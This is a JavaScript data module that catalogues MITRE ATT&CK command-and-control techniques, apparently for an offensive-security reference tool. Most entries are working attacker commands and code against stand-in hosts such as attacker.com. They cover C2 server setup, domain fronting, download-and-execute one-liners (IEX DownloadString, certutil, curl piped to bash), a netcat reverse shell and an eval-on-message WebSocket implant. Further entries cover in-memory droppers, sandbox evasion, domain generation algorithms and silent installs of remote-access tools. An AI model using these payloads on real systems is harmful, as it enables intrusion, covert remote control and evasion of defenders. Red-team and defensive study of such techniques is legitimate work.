export const COMMAND_AND_CONTROL = {
  id: "command-and-control",
  name: "Command & Control",
  tacticId: "TA0011",
  subtitle: "C2 Protocols • DNS/ICMP/WebSocket • Domain Fronting • Encrypted Channels • Proxy Chains • Remote Access Tools (RAT) • Ngrok/Reverse Tunnel • Fallback Channels • Multi-Stage C2 • Web Service C2 • Dynamic Resolution • DGA • Protocol Tunneling",
  color: "#f43f5e",
  techniques: [
    {
      name: "Application Layer Protocol",
      id: "T1071",
      summary: "HTTPS • DNS • HTTP • SMTP • WebSocket C2 traffic",
      description: "Use legitimate application-layer protocols for C2 communication to blend with normal traffic",
      tags: ["HTTPS", "DNS", "HTTP", "C2", "T1071"],
      steps: [
        "Cobalt Strike HTTPS C2 with malleable profile:\n# Malleable C2 profiles define exactly how beacon traffic looks on the wire\n# Without a profile: default CS traffic has well-known signatures (JA3, URI patterns)\n# With a profile: mimic O365, Slack, Google Analytics — same ports, similar headers\n$ ./teamserver ATTACKER_IP PASSWORD c2_profile.profile\n# Profile customizes: HTTP headers, URIs, cookies, POST body structure, sleep jitter\n# Example: use safebrowsing.googleapis.com profile to blend with Chrome traffic\n# Test JA3 fingerprint: curl -v https://c2.attacker.com 2>&1 | grep -i 'tls\\|ssl'\n# Reference profiles: https://github.com/BC-SECURITY/Malleable-C2-Profiles",
        "Sliver C2 setup (open source):\n$ sliver-server\n> generate --http attacker.com --os windows --arch amd64 --save /tmp/implant.exe\n> https --domain attacker.com --lport 443\n> mtls --lhost attacker.com --lport 8888\n# mTLS, HTTP, DNS, WireGuard transports",
        "DNS C2 with dnscat2:\n# DNS C2 works because DNS UDP/53 is almost always allowed outbound\n# Commands encoded in DNS query names (labels), results in TXT/CNAME responses\n# Slower than HTTP but near-universal bypass of restrictive firewalls\n$ ruby ./dnscat2.rb --dns domain=c2.attacker.com --no-cache\n# --no-cache: prevents DNS caching from breaking bidirectional comms\n# Client side (Windows implant):\n$ dnscat2.exe c2.attacker.com\n# Or PowerShell DNS C2 (no binary needed):\n$ Invoke-DNScat2 -Domain c2.attacker.com -DNSServer 8.8.8.8\n# Verify NS delegation works first:\n$ dig NS c2.attacker.com  # Should return your server",
        "ICMP C2:\n$ python3 icmpsh_m.py ATTACKER_IP TARGET_IP\n# ICMP tunneling - ping packets carry C2 data\n# Often allowed through firewalls\n# Tools: icmpsh, PingTunnel, ptunnel-ng",
        "WebSocket C2:\n> // Connect to attacker WebSocket server\n> ws = new WebSocket('wss://attacker.com/ws');\n> ws.onmessage = (e) => { eval(e.data); };\n# Real-time bidirectional C2\n# WebSocket looks like legitimate web traffic\n# Hard to detect with standard firewall rules"
      ]
    },
    {
      name: "Domain Fronting",
      id: "T1090.004",
      summary: "CDN fronting • Cloudflare • Azure Front Door • Fastly • SNI hiding",
      description: "Use CDN and cloud providers to disguise C2 traffic behind legitimate domains",
      tags: ["Cloudflare", "CDN fronting", "domain front", "T1090"],
      steps: [
        "Cloudflare domain fronting:\n# 1. Set up Cloudflare account, add attacker domain\n# 2. Configure Workers to proxy to real C2\n$ cat cloudflare-worker.js\n> addEventListener('fetch', event => {\n>     event.respondWith(fetch('https://real-c2.attacker.com' + new URL(event.request.url).pathname, event.request))\n> })\n# Traffic appears to come from Cloudflare IPs\n# TLS SNI shows cloudflare.com",
        "Azure Front Door fronting:\n# Create Azure Front Door pointing to legitimate domain\n# Backend: attacker's C2 server\n# SNI: legitimate-company.azurefd.net\n# HTTP Host header: attacker-c2-backend\n# Blocking Azure Front Door = blocking all Azure Front Door customers",
        "Amazon CloudFront fronting:\n# Configure CloudFront distribution\n# Origin: attacker's C2\n# Alternate domain names: use legitimate CloudFront domain\n$ curl -H 'Host: attacker-backend.com' https://d1234567890.cloudfront.net/beacon\n# SNI shows CloudFront, Host header routes to attacker",
        "C2 through cloud storage APIs:\n# Use Dropbox, OneDrive, Google Drive APIs as C2\n# Write commands to file in cloud storage\n# Implant polls cloud storage for new commands\n# Traffic: entirely to legitimate cloud storage APIs\n$ curl -H 'Authorization: Bearer DROPBOX_TOKEN' \\\n  'https://api.dropboxapi.com/2/files/download' \\\n  -H 'Dropbox-API-Arg: {\"path\":\"/cmd.txt\"}' -o cmd.txt && bash cmd.txt",
        "DNS over HTTPS (DoH) C2:\n$ curl 'https://cloudflare-dns.com/dns-query?name=cmd.c2.attacker.com&type=TXT' -H 'Accept: application/dns-json'\n# C2 encoded in DNS TXT records\n# Query goes to Cloudflare DNS (1.1.1.1) - fully encrypted\n# Indistinguishable from legitimate DoH traffic"
      ]
    },
    {
      name: "Encrypted Channel",
      id: "T1573",
      summary: "TLS • SSH tunnel • mTLS • custom encryption • certificate pinning",
      description: "Use encryption to protect C2 communication from interception and analysis",
      tags: ["TLS", "SSH tunnel", "mTLS", "custom crypto", "T1573"],
      steps: [
        "TLS C2 with valid certificate:\n$ certbot certonly --standalone -d c2.attacker.com --email attacker@example.com\n# Obtain valid Let's Encrypt certificate\n$ ./teamserver c2.attacker.com PASSWORD https_profile.profile\n# Valid HTTPS cert: bypasses certificate inspection warnings\n# Defenders need full TLS inspection proxy to see content",
        "SSH tunneling for C2:\n$ ssh -R 8080:localhost:4444 attacker@pivot.attacker.com\n# Remote port forward: connections to pivot:8080 → local:4444\n$ ssh -D 1080 user@compromised-host\n# SOCKS5 proxy through SSH for C2 traffic\n# SSH traffic usually allowed through firewalls",
        "Mutual TLS (mTLS) for C2 authentication:\n# Generate client + server certificates\n$ openssl genrsa -out client.key 4096\n$ openssl req -new -key client.key -out client.csr\n$ openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt\n# Only implants with valid client cert can reach C2\n# Blocks scanners and researchers probing C2 server",
        "Custom XOR/AES encryption layer:\n> // Implant encrypts all data before sending\n> byte[] key = Encoding.UTF8.GetBytes(\"SecretKey123456\");\n> using var aes = Aes.Create();\n> aes.Key = key;\n> aes.IV = randomIV;\n> // Encrypt command results, send to C2\n# Breaks SSL inspection if key not known to proxy",
        "Certificate pinning to prevent MITM:\n> // Implant only accepts specific certificate hash\n> X509Certificate2 expected = new X509Certificate2(expectedCertBytes);\n> ServicePointManager.ServerCertificateValidationCallback = (s, cert, chain, err) => {\n>     return cert.GetCertHashString() == expected.GetCertHashString();\n> };\n# Prevents defenders from inserting proxy with different cert"
      ]
    },
    {
      name: "Proxy",
      id: "T1090",
      summary: "Multi-hop proxy • SOCKS5 • reverse tunnel • redirectors",
      description: "Use proxy chains and redirectors to obscure C2 infrastructure",
      tags: ["SOCKS5", "reverse tunnel", "proxy chain", "T1090"],
      steps: [
        "SOCKS5 proxy via compromised host:\n# SSH dynamic forwarding creates a local SOCKS5 proxy that routes all traffic through the remote host\n# Any tool that supports SOCKS5 (or via proxychains) can reach networks the compromised host can see\n$ ssh -D 1080 -N -q user@compromised-host\n# -D 1080: listen on local port 1080 as SOCKS5 proxy\n# -N: no remote command (keep-alive), -q: quiet mode\n$ proxychains4 nmap -sT -Pn 192.168.10.0/24  # -sT required (no raw sockets through SOCKS)\n$ proxychains4 psexec.py domain/admin:pass@192.168.10.100\n# Configure proxychains: echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\n# Pro tip: proxychains only works for TCP — use SOCKS5 natively for UDP tools",
        "Cobalt Strike reverse port forward:\n> rportfwd 8080 192.168.10.10 80\n# Beacon forwards port 8080 on compromised host to 192.168.10.10:80\n# Allows reaching segmented networks\n> socks 1080\n# SOCKS5 proxy through beacon",
        "Chisel tunnel:\n# Attacker server:\n$ chisel server --port 8080 --reverse\n# Compromised host:\n$ chisel client attacker.com:8080 R:socks\n# Creates SOCKS5 at attacker:1080\n# Or specific port forward:\n$ chisel client attacker.com:8080 R:3389:192.168.10.100:3389",
        "Ligolo-ng for layer 3 pivoting (better than SOCKS):\n# Ligolo-ng creates a real TUN interface — tools behave as if directly on the internal network\n# Unlike SOCKS: supports UDP, ICMP, and any TCP tool without proxychains\n# Attacker (proxy server, listens for agents):\n$ ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601\n# Compromised host (agent, connects back to proxy):\n$ ligolo-ng/agent -connect attacker.com:11601 -ignore-cert\n# In proxy console: start the tunnel session\n> session  # Select active agent session\n> start    # Brings up the tun interface\n# Add route on attacker to reach internal subnet:\n$ sudo ip route add 192.168.10.0/24 dev ligolo\n# Now: nmap, impacket, all tools work directly against 192.168.10.x\n# No proxychains needed — full layer-3 connectivity",
        "Redirector setup with socat:\n$ socat TCP-LISTEN:443,fork TCP:real-c2.attacker.com:443\n# All traffic to redirector:443 → real C2\n# Redirector IP shows in logs, not real C2\n# nginx reverse proxy also effective:\n$ nginx -c /etc/nginx/redirector.conf"
      ]
    },
    {
      name: "Ingress Tool Transfer",
      id: "T1105",
      summary: "Download tools • curl • wget • PowerShell download • certutil",
      description: "Transfer attack tools and payloads from external infrastructure to compromised systems",
      tags: ["curl", "wget", "PowerShell", "certutil", "T1105"],
      steps: [
        "HTTP/S download:\n$ curl -L http://attacker.com/tool -o /tmp/tool && chmod +x /tmp/tool\n$ wget -q http://attacker.com/payload.exe -O C:\\Windows\\Temp\\payload.exe\n$ curl -k https://attacker.com/shellcode.bin | xxd | ...\n# -k: ignore cert errors; -L: follow redirects",
        "PowerShell download:\n> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\n> (New-Object Net.WebClient).DownloadFile('http://attacker.com/tool.exe', 'C:\\Temp\\tool.exe')\n> Invoke-WebRequest -Uri 'http://attacker.com/tool.exe' -OutFile 'C:\\Temp\\tool.exe' -UseBasicParsing\n# Multiple download methods for compatibility",
        "Living off the land downloads:\n$ certutil -urlcache -split -f http://attacker.com/tool.exe C:\\Temp\\tool.exe\n$ bitsadmin /transfer update http://attacker.com/tool.exe C:\\Temp\\tool.exe\n$ msiexec /q /i http://attacker.com/payload.msi\n# Use built-in Windows tools for download\n# Avoids explicit download tool signatures",
        "DNS exfiltration of tools (extreme bypass):\n# Split binary into base64 chunks\n# Encode each chunk in DNS TXT query response\n# Reassemble on target from DNS responses\n$ python3 dns_transfer.py --domain transfer.attacker.com --file tool.exe\n# Works even with HTTP/S completely blocked",
        "SMB/FTP/SFTP transfer:\n$ copy \\\\attacker.com\\share\\tool.exe C:\\Temp\\\n$ ftp -n attacker.com <<EOF\n> user anonymous anonymous@test.com\n> binary\n> get tool.exe\n> bye\n> EOF\n# SMB transfer requires open port 445 to attacker"
      ]
    },
    {
      name: "Non-Standard Port",
      id: "T1571",
      summary: "Custom port C2 • port 443 for non-HTTPS • port 53 abuse • uncommon ports",
      description: "Use non-standard or unexpected ports to evade network monitoring",
      tags: ["custom port", "port 53", "port abuse", "T1571"],
      steps: [
        "C2 on expected port but wrong protocol:\n# Run HTTP C2 on port 443 (expected HTTPS)\n# TLS inspection reveals non-HTTPS traffic on 443\n# Run DNS C2 on port 53 UDP (DNS expected)\n$ dnscat2-server --dns port=53,domain=c2.attacker.com\n# Use protocols expected on those ports",
        "C2 on high/uncommon ports:\n$ nc -lp 31337 -e /bin/bash  # Classic high port\n# Use ports that are often allowed: 8080, 8443, 4444\n# Some environments only filter 80/443/25/22\n# Test which ports are allowed before deploying C2",
        "Port 80/443 for all C2 (standard approach):\n# Most environments allow 80 and 443 outbound\n# Use these for reliability, not evasion\n$ cobalt-strike: listener HTTPS on port 443\n# Blend into normal web traffic\n# Malleable C2 profile makes it look like legitimate web app",
        "Firewall egress testing:\n$ for port in 21 22 23 25 53 80 110 143 443 445 3389 8080 8443 9090; do nc -zv attacker.com $port 2>&1 | grep -v refused; done\n# Test which outbound ports work\n# Choose C2 port based on what's allowed through egress firewall",
        "Protocol mismatch detection evasion:\n# Run SMTP C2 on port 25 - mail traffic expected\n# Run FTP C2 on port 21 - file transfer expected\n# Protocol matching port makes less suspicious\n# HTTP on port 80, HTTPS on port 443 = least suspicious"
      ]
    },
    {
      name: "Traffic Signaling / Covert C2",
      id: "T1205.c2",
      summary: "Steganography C2 • social media C2 • legitimate service abuse",
      description: "Use covert channels and legitimate services for stealthy C2 communication",
      tags: ["steganography C2", "Twitter C2", "GitHub C2", "T1205"],
      steps: [
        "Twitter/X C2:\n# Implant monitors specific account for tweets via API\n# Commands encoded in tweet text or images\n$ python3 -c \"\nimport tweepy\nclient = tweepy.Client(bearer_token='BEARER', consumer_key='CK', consumer_secret='CS', access_token='AT', access_token_secret='ATS')\ntweets = client.get_users_tweets(id='C2_ACCOUNT_ID', max_results=5)\nprint([t.text for t in tweets.data])\n\"\n# Tweets are public — no network IOC to block",
        "GitHub C2:\n# Create GitHub repo, commit files with encoded commands\n# Implant polls repo via GitHub API on schedule\n$ curl -H 'Authorization: Bearer GITHUB_TOKEN' \\\n  'https://api.github.com/repos/attacker/c2-repo/contents/cmd.txt' | jq -r '.content' | base64 -d\n# GitHub API traffic: allowed everywhere\n# Commands in files, responses committed back to repo",
        "Steganography C2:\n# Implant fetches image from public website\n# Commands hidden in image pixel data\n$ steghide embed -cf innocent.jpg -ef commands.txt -p 'key'\n# Server serves different images with different commands\n# Traffic: HTTP request for image = normal web browsing",
        "Slack C2:\n# Implant polls Slack channel for commands via API\n$ curl -H 'Authorization: Bearer xoxb-SLACK-TOKEN' \\\n  'https://slack.com/api/conversations.history?channel=CHANNEL_ID&limit=1'\n# Post response: curl -X POST ... chat.postMessage\n# Corporate environments trust Slack/Discord traffic\n# SlackBot token: can read/write any channel in workspace"
      ]
    },
    {
      name: "Dynamic Resolution",
      id: "T1568",
      summary: "Fast flux DNS • DGA • domain fronting rotation • C2 IP rotation",
      description: "Dynamically change C2 infrastructure to avoid detection and takedowns",
      tags: ["fast flux", "DGA", "domain rotation", "T1568"],
      steps: [
        "Fast flux DNS (single-flux):\n# Fast flux exploits short TTLs to rotate C2 IPs faster than defenders can block\n# Classic botnet technique: 5-10 compromised hosts serve as rotating A records\n# TTL 60s: by the time a SOC blocks the IP, DNS has already rotated\n# Register multiple C2 IPs, all pointing to same domain with very low TTL:\n$ python3 fastflux.py --domain c2.attacker.com --ips ip1,ip2,ip3,ip4 --ttl 60\n# Manually via Cloudflare API to rotate records:\n$ curl -X PUT 'https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records/REC_ID' \\\n  -H 'Authorization: Bearer CF_TOKEN' -d '{\"type\":\"A\",\"name\":\"c2\",\"content\":\"NEW_IP\",\"ttl\":60}'\n# Defenders: need to block the domain, not just the IP — much harder to do quickly",
        "Double-flux DNS (NS rotation too):\n# Both A records AND NS records rotate\n# NS servers also part of botnet\n# Extremely resilient: takedown requires seizing domain\n# Blocks and sinkholing much harder",
        "Domain Generation Algorithm (DGA):\n# DGA: both implant and attacker compute the same domain from a shared seed (date, key)\n# Implant tries each generated domain until one responds — attacker registers winners in advance\n# Defenders can't block DGA proactively without knowing the seed and algorithm\n# Seed-based DGA using daily date (implant and server compute identically):\n> DateTime today = DateTime.Today;\n> Random rng = new Random(today.Year * 10000 + today.Month * 100 + today.Day);\n> string domain = \"\";\n> for (int i = 0; i < 12; i++) domain += (char)('a' + rng.Next(26));\n> domain += \".com\";\n# Cryptographic DGA using HMAC (harder to reverse-engineer):\n> string domain = Convert.ToHexString(HMAC_SHA256(key, today.ToString())).Substring(0, 16) + \".net\";\n# Attacker registers generated domains 1 week in advance\n# Analysis-resistant: reverse-engineering the DGA requires finding the key",
        "Peer-to-peer C2 infrastructure:\n# Distribute C2 across compromised hosts\n# Each bot can be a C2 relay\n# No central server to take down\n# Examples: Emotet P2P, TrickBot botnet\n$ sliver-server\n> wg-listener --lhost attacker.com  # WireGuard P2P mode",
        "CDN rotation with multiple providers:\n# Register on: Cloudflare, Fastly, AWS CloudFront, Azure CDN\n# Rotate backend servers across providers\n# Different IP ranges from different ISPs\n# Blocking one CDN blocks millions of legitimate sites"
      ]
    },
    {
      name: "Protocol Tunneling",
      id: "T1572",
      summary: "DNS tunneling • HTTP tunneling • ICMP tunnel • SSH-over-HTTPS • iodine",
      description: "Tunnel C2 communications through allowed protocols to bypass network controls",
      tags: ["DNS tunnel", "HTTP tunnel", "ICMP tunnel", "T1572"],
      steps: [
        "DNS tunneling with iodine:\n# Server side:\n$ iodined -f -c -P password 10.0.0.1 tunnel.attacker.com\n# Client side:\n$ iodine -f -P password tunnel.attacker.com\n# Creates tunnel interface - route all traffic through DNS\n# Works when only UDP 53 is allowed outbound",
        "HTTP/HTTPS tunneling:\n$ ./httptunnel-3.3/htc --forward-port 8888 attacker.com:80\n$ ./httptunnel-3.3/hts --forward-port 8888 localhost:22\n# Tunnel TCP (SSH) over HTTP\n# Traffic appears as HTTP requests",
        "ICMP tunneling with ptunnel-ng:\n# Server:\n$ ptunnel-ng -r127.0.0.1 -R22\n# Client:\n$ ptunnel-ng -p attacker.com -lp 2222 -da 127.0.0.1 -dp 22\n$ ssh -p 2222 localhost\n# SSH tunneled through ICMP echo/reply",
        "DNS over HTTPS (DoH) tunneling:\n# Route DNS tunnel through HTTPS to trusted resolver\n# All DNS queries encrypted to Cloudflare/Google\n# Indistinguishable from legitimate DoH traffic\n$ doh-client --doh-url https://cloudflare-dns.com/dns-query",
        "QUIC/HTTP3 C2:\n# HTTP3 uses UDP-based QUIC protocol\n# Many firewalls don't inspect QUIC\n# Cobalt Strike, Sliver adding QUIC transport\n# Low detection rate as security tools lag"
      ]
    },
    {
      name: "Fallback Channels",
      id: "T1008",
      summary: "Primary/secondary C2 • backup protocols • redundant infrastructure • resilient C2",
      description: "Use multiple fallback C2 channels so that if the primary channel is blocked, communication continues",
      tags: ["fallback C2", "backup channel", "resilient C2", "T1008"],
      steps: [
        "Configure Cobalt Strike multi-listener fallback:\n# In Cobalt Strike aggressor script:\n> $listeners = @('HTTPS-Primary', 'DNS-Fallback', 'SMB-Internal')\n# Beacon tries HTTPS first, falls back to DNS, then SMB\n# Malleable C2: set multiple transport blocks with priority",
        "Sliver multi-C2 configuration:\n$ sliver > generate --http primary-c2.attacker.com --dns backup.attacker.com --save /tmp/implant.exe\n# Implant tries HTTP first, falls back to DNS automatically\n# Each transport has independent config and jitter",
        "DNS as guaranteed fallback:\n# DNS (UDP 53) almost always allowed outbound\n# Set up dnscat2 or Sliver DNS listener as backup\n$ ruby ./dnscat2.rb --dns domain=fallback.c2.attacker.com --no-cache\n# If HTTP/S is blocked: DNS almost always works\n# Slower but reliable last resort",
        "Hardcoded fallback IPs in implant:\n> string[] c2_servers = { 'primary-c2.attacker.com', 'backup-c2.attacker.net', 'emergency-c2.attacker.org' };\n> foreach (var c2 in c2_servers) {\n>     try { ConnectToC2(c2); break; }\n>     catch { continue; }\n> }\n# Try each C2 in order until one responds\n# If primary is burned/sinkholed: backup activates",
        "P2P fallback within compromised network:\n# If internet C2 is blocked: use Cobalt Strike SMB beacons\n# One machine with internet access → SMB P2P to others\n$ beacon> link 192.168.1.50  # SMB beacon chain\n# Internal machines don't need internet access\n# Only one external connection needed for entire network"
      ]
    },
    {
      name: "Multi-Stage Channels",
      id: "T1104",
      summary: "Staged payloads • multi-stage loaders • dropper → stage2 → beacon",
      description: "Use multiple staged delivery mechanisms to separate initial access from full C2 capability",
      tags: ["staged payload", "multi-stage", "dropper", "T1104"],
      steps: [
        "Three-stage payload architecture (why it matters):\n# Security researchers and sandboxes analyze stage 0 (the phishing doc/attachment)\n# If stage 0 contains C2 domain/IP: trivial to burn your infrastructure\n# Solution: separate concerns across stages so each stage only knows the next step\n# Stage 0: Initial access document (macro, HTA, LNK) — no C2, just downloads stage 1\n# Stage 1: Lightweight downloader/dropper (small, minimal IOC) — fetches stage 2\n# Stage 2: Full beacon/implant (Cobalt Strike, Sliver) — full C2 capability\n# Separation: if stage 0 is analyzed in sandbox → stage 1 URL is burned but C2 is safe\n# Burn stage 1 URL? Replace the redirect destination, stage 0 artifact still works",
        "Stage 1 dropper with minimal footprint:\n> // Stage 1: small downloader\n> var wc = new WebClient();\n> var enc = wc.DownloadData('https://c2.attacker.com/stage2');\n> var dec = Decrypt(enc, hardcoded_key);\n> var asm = Assembly.Load(dec);\n> asm.EntryPoint.Invoke(null, null);\n# 2KB dropper - downloads and decrypts stage 2 in memory\n# No stage 2 touches disk",
        "Environmental keying for stage progression:\n> // Only download stage 2 if on target environment\n> if (!Environment.MachineName.EndsWith('.target.com')) return;\n> if (Environment.UserName == 'sandbox') return;\n# Stage 1 checks environment before fetching stage 2\n# Sandbox analysis: stage 2 never delivered\n# Evasion: analyst gets clean stage 1 only",
        "Time-delayed staging:\n> // Stage 1 waits X days before proceeding to stage 2\n> var installDate = GetRegistryInstallDate();\n> if ((DateTime.Now - installDate).Days < 7) return;\n# 7-day dormancy before stage 2 download\n# Defeats sandbox analysis (max 24-48h observation)\n# Used by APT groups for long dwell time",
        "Meterpreter staging:\n$ msfconsole\n> use exploit/multi/handler\n> set PAYLOAD windows/x64/meterpreter/reverse_https\n> set LHOST attacker.com\n> set LPORT 443\n> set StagerRetryCount 10\n# Meterpreter: stage 0 connects → receives stage 1 (stager) → receives full Meterpreter DLL\n# Only stage 0 shellcode in initial payload — tiny footprint"
      ]
    },
    {
      name: "Remote Access Tools",
      id: "T1219",
      summary: "TeamViewer abuse • AnyDesk • ScreenConnect • Cobalt Strike • commercial RAT",
      description: "Use legitimate remote access tools as C2 to blend with normal IT management traffic",
      tags: ["TeamViewer", "AnyDesk", "ScreenConnect", "remote access", "T1219"],
      steps: [
        "Deploy legitimate RAT for covert access:\n# TeamViewer unattended installation:\n$ TeamViewer.exe --id ATTACKER_ID --password ACCESS_PASS /S\n# AnyDesk silent install:\n$ AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent\n$ echo 'ATTACKER_PASSWORD' | AnyDesk.exe --set-password\n# Access: open TeamViewer/AnyDesk from attacker side with ID+pass",
        "ScreenConnect (ConnectWise) deployment:\n$ msiexec /i ConnectWiseControl.ClientSetup.msi /quiet ACCESS_PASSWORD=pass ACCESS_NAME=victim\n# MSP-style deployment — blends with IT management\n# ScreenConnect traffic: HTTPS to connectwise.com\n# Widely trusted in corporate environments\n# Used in many ransomware operations for persistent access",
        "Ngrok reverse tunnel as C2 relay:\n$ ngrok tcp 4444  # Expose local C2 port\n$ ngrok http 8080  # Expose C2 web panel\n# Ngrok provides persistent domain: xxxxxx.ngrok.io\n# Traffic goes to ngrok.com — widely trusted, hard to block\n# Use in implant: connect to xxxxxxx.ngrok.io:PORT",
        "Legitimate RMM tool abuse (Kaseya, ConnectWise, N-able):\n# These tools have agent installed on managed endpoints\n# Once attacker has MSP-level access: deploy scripts to all clients\n# MSP discovery: nmap -p 443 --script ssl-cert 192.168.1.0/24 | grep -i 'kaseya\\|connectwise\\|labtech'\n# RMM agents run as SYSTEM — mass deployment vector",
        "SimpleHelp / Splashtop deployment:\n$ wget https://attacker.com/SimpleHelpSetup.exe -O /tmp/update.exe && /tmp/update.exe /silent\n# Many smaller RATs used: SimpleHelp, Splashtop, Supremo, Zoho Assist\n# Install silently, configure to connect to attacker infrastructure\n# Disguise: rename binary to match legitimate IT tools"
      ]
    },
    {
      name: "Web Service C2",
      id: "T1102",
      summary: "Paste sites • cloud storage • social media • code repos • legitimate APIs",
      description: "Use legitimate web services for C2 to avoid detection and blocking",
      tags: ["Pastebin", "cloud storage", "social media", "T1102"],
      steps: [
        "Pastebin C2:\n# Post commands to Pastebin, implant polls and executes\n$ curl 'https://pastebin.com/raw/PASTE_ID'\n> $cmd = (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/PASTE_ID')\n> iex $cmd\n# Pastebin is commonly allowed - hard to block without false positives",
        "Dropbox C2:\n$ python3 DropboxC2.py --token DROPBOX_API_TOKEN\n# Create files in Dropbox folder = commands\n# Implant downloads files, executes, uploads results\n# Dropbox traffic uses HTTPS to legitimate Dropbox IPs",
        "Google Drive C2 with PyDriveC2:\n$ python3 PyDriveC2.py --credentials credentials.json --folder-id FOLDER_ID\n# Create text files with commands in Drive folder\n# Implant uses Drive API to read/write files\n# All traffic to googleapis.com",
        "Notion C2 with OffensiveNotion:\n$ ./OffensiveNotion --token secret_XXXXX --page-id PAGE_ID\n# Use Notion pages as command delivery\n# Read page → extract command → execute → write result\n# Notion becoming standard tool in many orgs"
      ]
    }
  ]
};